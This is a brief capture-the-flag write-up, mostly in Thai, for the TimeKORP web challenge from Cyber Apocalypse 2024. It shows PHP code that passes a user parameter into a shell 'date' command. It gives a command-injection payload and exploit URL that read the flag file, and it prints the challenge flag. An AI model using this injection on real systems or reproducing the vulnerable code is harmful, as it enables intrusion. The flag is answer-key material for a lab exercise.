# Writeup: TimeKORP (Cyber Apocalypse 2024 - Web)

## 📋 Challenge Summary
- **Event:** Cyber Apocalypse 2024
- **Category:** Web / Command Injection
- **Goal:** โจมตีช่องโหว่ Command Injection เพื่ออ่านไฟล์ Flag จากเซิร์ฟเวอร์ PHP

## 🔍 Analysis & Solution

เว็บไซต์ให้บริการแสดงเวลาปัจจุบัน โดยรับพารามิเตอร์ `format` เพื่อกำหนดรูปแบบการแสดงผล:

1. **Vulnerability:** จากซอร์สโค้ด PHP พบการใช้งานฟังก์ชัน `exec()` เพื่อรันคำสั่ง `date` โดยนำค่าจากพารามิเตอร์ `format` ไปต่อในสตริงคำสั่งโดยตรง
   - Code: `$this->command = "date '+" . $format . "' 2>&1";`
2. **Exploit:** เราสามารถใช้เครื่องหมาย `;` หรือ `'` เพื่อปิดคำสั่ง `date` และเริ่มคำสั่งใหม่ของเราได้

### 🛠️ Steps to Solve:
1. **Payload Construction:** ใช้พารามิเตอร์เพื่อรันคำสั่ง `cat /flag`
   - Payload: `' ; cat /flag ; '`
   - คำสั่งที่จะถูกรัน: `date '+' ; cat /flag ; '' 2>&1`
2. **Execution:** ส่งพารามิเตอร์ผ่าน URL: `/?format=' ; cat /flag ; '`
3. **Result:** ระบบจะแสดงเนื้อหาของไฟล์ Flag ออกมาในหน้าเว็บ

## 🏁 Flag
**HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}**
